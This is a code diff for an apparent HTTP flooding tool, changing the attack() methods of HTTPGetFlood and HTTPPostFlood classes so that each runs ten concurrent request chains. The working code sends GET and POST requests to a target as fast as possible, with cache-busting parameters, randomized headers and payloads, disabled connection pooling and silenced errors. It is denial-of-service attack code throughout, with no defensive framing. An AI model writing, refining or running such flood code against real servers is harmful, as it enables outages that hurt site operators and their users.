@@ -65,54 +65,60 @@ export class HTTPGetFlood {
     }
 
     async attack() {
-        return new Promise((resolve) => {
-            const options = {
-                hostname: this.url.hostname,
-                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
-                path: this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + `_=${Date.now()}_${Tools.randomString(8)}`,
-                method: 'GET',
-                headers: this.generateHeaders(),
-                timeout: 300,
-                agent: false // Disable connection pooling for more connections
-            };
+        const promises = [];
+        
+        // Create multiple concurrent request chains
+        for (let chain = 0; chain < 10; chain++) {
+            const promise = new Promise((resolve) => {
+                let completed = 0;
+                
+                const makeRequest = () => {
+                    if (!this.active || completed >= this.rpc) {
+                        resolve();
+                        return;
+                    }
 
-            const protocol = this.url.protocol === 'https:' ? https : http;
-            let completed = 0;
+                    try {
+                        const options = {
+                            hostname: this.url.hostname,
+                            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
+                            path: this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + `_=${Date.now()}_${Tools.randomString(8)}`,
+                            method: 'GET',
+                            headers: this.generateHeaders(),
+                            timeout: 300,
+                            agent: false
+                        };
 
-            const makeRequest = () => {
-                if (!this.active || completed >= this.rpc) {
-                    resolve();
-                    return;
-                }
+                        const protocol = this.url.protocol === 'https:' ? https : http;
+                        
+                        const req = protocol.request(options, (res) => {
+                            REQUESTS_SENT.add(1);
+                            res.on('data', () => {});
+                            res.on('end', () => {});
+                        });
 
-                try {
-                    const req = protocol.request(options, (res) => {
-                        REQUESTS_SENT.add(1);
-                        res.on('data', () => {});
-                        res.on('end', () => {});
-                    });
+                        req.on('error', () => {});
+                        req.on('timeout', () => req.destroy());
 
-                    req.on('error', () => {});
-                    req.on('timeout', () => req.destroy());
-
-                    req.end();
-                    BYTES_SENT.add(JSON.stringify(options.headers).length);
-                    completed++;
-                    
-                    // Fire next request immediately
-                    setImmediate(makeRequest);
-                } catch (e) {
-                    setImmediate(makeRequest);
-                }
-            };
-
-            // Start 10 request chains simultaneously
-            for (let i = 0; i < 10; i++) {
+                        req.end();
+                        BYTES_SENT.add(JSON.stringify(options.headers).length);
+                        completed++;
+                        
+                        // Fire next request immediately
+                        setImmediate(makeRequest);
+                    } catch (e) {
+                        setImmediate(makeRequest);
+                    }
+                };
+                
                 makeRequest();
-            }
-
-            setTimeout(resolve, 500);
-        });
+            });
+            
+            promises.push(promise);
+        }
+        
+        // Wait for all chains to complete
+        await Promise.allSettled(promises);
     }
 
     stop() {
@@ -135,65 +141,72 @@ export class HTTPPostFlood extends HTTPGetFlood {
     }
 
     async attack() {
-        return new Promise((resolve) => {
-            const payload = this.generatePayload();
-            const headers = this.generateHeaders();
-            headers['Content-Type'] = Tools.randomChoice([
-                'application/json',
-                'application/x-www-form-urlencoded',
-                'multipart/form-data',
-                'text/plain'
-            ]);
-            headers['Content-Length'] = Buffer.byteLength(payload);
-            headers['X-Requested-With'] = 'XMLHttpRequest';
+        const promises = [];
+        
+        // Create multiple concurrent request chains
+        for (let chain = 0; chain < 10; chain++) {
+            const promise = new Promise((resolve) => {
+                let completed = 0;
+                
+                const makeRequest = () => {
+                    if (!this.active || completed >= this.rpc) {
+                        resolve();
+                        return;
+                    }
 
-            const options = {
-                hostname: this.url.hostname,
-                port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
-                path: this.url.pathname + this.url.search,
-                method: 'POST',
-                headers: headers,
-                timeout: 300,
-                agent: false
-            };
+                    try {
+                        const payload = this.generatePayload();
+                        const headers = this.generateHeaders();
+                        headers['Content-Type'] = Tools.randomChoice([
+                            'application/json',
+                            'application/x-www-form-urlencoded',
+                            'multipart/form-data',
+                            'text/plain'
+                        ]);
+                        headers['Content-Length'] = Buffer.byteLength(payload);
+                        headers['X-Requested-With'] = 'XMLHttpRequest';
 
-            const protocol = this.url.protocol === 'https:' ? https : http;
-            let completed = 0;
+                        const options = {
+                            hostname: this.url.hostname,
+                            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
+                            path: this.url.pathname + this.url.search,
+                            method: 'POST',
+                            headers: headers,
+                            timeout: 300,
+                            agent: false
+                        };
 
-            const makeRequest = () => {
-                if (!this.active || completed >= this.rpc) {
-                    resolve();
-                    return;
-                }
+                        const protocol = this.url.protocol === 'https:' ? https : http;
+                        
+                        const req = protocol.request(options, (res) => {
+                            REQUESTS_SENT.add(1);
+                            res.on('data', () => {});
+                            res.on('end', () => {});
+                        });
 
-                try {
-                    const req = protocol.request(options, (res) => {
-                        REQUESTS_SENT.add(1);
-                        res.on('data', () => {});
-                        res.on('end', () => {});
-                    });
+                        req.on('error', () => {});
+                        req.on('timeout', () => req.destroy());
 
-                    req.on('error', () => {});
-                    req.on('timeout', () => req.destroy());
-
-                    req.write(payload);
-                    req.end();
-                    
-                    BYTES_SENT.add(Buffer.byteLength(payload) + JSON.stringify(options.headers).length);
-                    completed++;
-                    
-                    setImmediate(makeRequest);
-                } catch (e) {
-                    setImmediate(makeRequest);
-                }
-            };
-
-            for (let i = 0; i < 10; i++) {
+                        req.write(payload);
+                        req.end();
+                        
+                        BYTES_SENT.add(Buffer.byteLength(payload) + JSON.stringify(options.headers).length);
+                        completed++;
+                        
+                        setImmediate(makeRequest);
+                    } catch (e) {
+                        setImmediate(makeRequest);
+                    }
+                };
+                
                 makeRequest();
-            }
-
-            setTimeout(resolve, 500);
-        });
+            });
+            
+            promises.push(promise);
+        }
+        
+        // Wait for all chains to complete
+        await Promise.allSettled(promises);
     }
 }
 
